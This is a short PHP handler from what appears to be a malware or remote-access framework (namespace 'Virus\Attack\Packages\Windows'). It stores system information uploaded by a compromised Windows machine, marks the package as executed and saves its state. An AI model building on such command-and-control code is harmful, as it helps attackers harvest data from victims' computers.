<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\SystemInfo\SystemInfo;

/** @var SystemInfo $this */

$this->setSystemInfo($this->requestData->fileCheck("systemFile"));
$this->setExecuted();
$this->saveState();